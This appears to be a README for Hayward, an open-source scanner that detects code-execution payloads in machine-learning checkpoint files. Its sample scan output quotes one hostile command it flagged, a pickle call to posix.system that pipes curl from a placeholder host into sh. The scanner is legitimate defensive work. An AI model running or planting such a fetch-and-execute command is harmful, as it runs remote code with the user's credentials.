# Hayward

**Security scanner for machine-learning model files.** Know whether a
checkpoint will run code on your machine, before you load it.

![License MIT](https://img.shields.io/badge/license-MIT-013D5A?style=flat-square&labelColor=013D5A)
![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-013D5A?style=flat-square&labelColor=013D5A)
![Rules 47](https://img.shields.io/badge/rules-47-013D5A?style=flat-square&labelColor=013D5A)
![Dependencies 1](https://img.shields.io/badge/dependencies-1-708C69?style=flat-square&labelColor=013D5A)
![No outbound calls](https://img.shields.io/badge/outbound_calls-none-F4A25B?style=flat-square&labelColor=013D5A)

```bash
pip install hayward
hayward scan ./models
```

```
CRITICAL MFV-PICKLE-001  checkpoints/model.pt
         Pickle file references unsafe callable(s) that grant code/command
         execution on load: posix.system('curl http://example.invalid | sh').

1 finding(s): 1 critical
```

Or [try it in your browser](https://huggingface.co/spaces/hedgerow-dev/hayward).
Same scanner, compiled to WebAssembly. Drop a checkpoint on the page and it
stays on your machine.

## The problem

`torch.load`, `joblib.load` and `numpy.load(allow_pickle=True)` execute code
from the file they read. That is not a bug, it is what pickle does.

The file is named `pytorch_model.bin`, and the `.bin` is doing a lot of work
in that sentence. It is a program. Loading it is running it, on your laptop,
with your credentials, as you.

## Who it is for

Teams that pull checkpoints from public hubs and want the check to run in a CI
pipeline, on a laptop, or inside a regulated environment where nothing is
allowed to leave the network.

## What makes it different

**It stays quiet.** A gate that cries wolf gets switched off, so it is built to
report real models cleanly and reserve the INFO tier for content it could not
verify. Any figures we quote are **self-measured and not independently
reproducible**; [Accuracy](docs/accuracy.md) sets out what it does and does not
support, and the harness runs it against your own corpus.

**It tells you when it could not look.** A file it cannot parse produces an
explicit finding, never silence. Attackers hide payloads behind deliberate
parse errors, and a clean report should mean the file was read.

**It catches gadgets nobody has listed.** Unknown callables are judged by the
arguments they were handed, not by their name. A URL, a shell command, a host
and port. That is what generalises past the deny list.

**It installs anywhere.** One dependency, no model framework, no native
extensions, no network. Python 3.10 and up.

**It fits a build.** Documented exit codes, JSON output, a threshold you set.

## What it scans

| | Formats |
|---|---|
| **Pickle, and everything that wraps it** | PyTorch (zip, legacy and `.ptl` mobile), joblib, NumPy `.npy` / `.npz`, TorchServe `.mar`, NVIDIA NeMo, skops |
| **Tensor containers** | SafeTensors, GGUF, TFLite |
| **Graph formats** | ONNX, TensorFlow SavedModel, Keras (H5 and `.keras`), PMML |
| **Repo config** | HuggingFace `config.json` / `tokenizer_config.json` (`auto_map`, `trust_remote_code`, and Jinja `chat_template` injection) |

26 extensions in total. **Format comes from magic bytes**, so a payload
renamed `weights.safetensors`, or `weights.dat`, or given no extension at
all, does not walk past on the strength of its name. A directory scan still
finds its candidates by extension first, since sniffing a whole tree means
reading it: [coverage](docs/coverage.md) states that limit.

## Three ways to run it

```bash
hayward scan ./models                          # command line
hayward scan ./models -f html -o report.html   # shareable report
hayward-gui                                    # desktop window
```

```python
from hayward import ModelFileScanner
findings = ModelFileScanner().scan_directory(Path("models"))
```

## What a clean result means

That Hayward read the files and recognised nothing dangerous in them. Not that
the model is safe. It is a smoke alarm, not a survey of the building, and
[coverage](docs/coverage.md) is the page where it owns up to the rooms it
could not get into.

## Documentation

- [Usage](docs/usage.md): CLI reference, exit codes, CI, the GUI, the Python API
- [Rules](docs/rules.md): all 47 rules with severities and CWE mappings
- [Coverage](docs/coverage.md): what it does when it cannot read a file, and why that is a finding
- [How it works](docs/how-it-works.md): how it reads pickle without running it, and how unknown callables are judged by their arguments
- [GitHub Action](docs/github-action.md): run the scan in CI and upload SARIF to code scanning
- [Reproducible builds](docs/reproducible-builds.md): the Docker image and the browser-demo build pipeline
- [Accuracy](docs/accuracy.md): measured results, the caveats, and where it loses

## Contributing

The most useful contribution is a file Hayward gets wrong. False alarms count
just as much as misses. A scanner nobody trusts is a scanner nobody runs, and
then it may as well not exist.

```bash
git clone https://github.com/hedgerow-dev/hayward
cd hayward && pip install -e ".[dev]" && pytest
```

## Security

Report vulnerabilities in Hayward to hello@hedgerow.dev rather than in an
issue. Input that crashes the scanner counts: under a CI gate, a crash is
indistinguishable from a scan that never ran.

## Licence

MIT. See [LICENSE](LICENSE) and [NOTICE](NOTICE).

A *hayward* was the parish officer who walked the hedges, checked the gaps and
impounded whatever had got through.
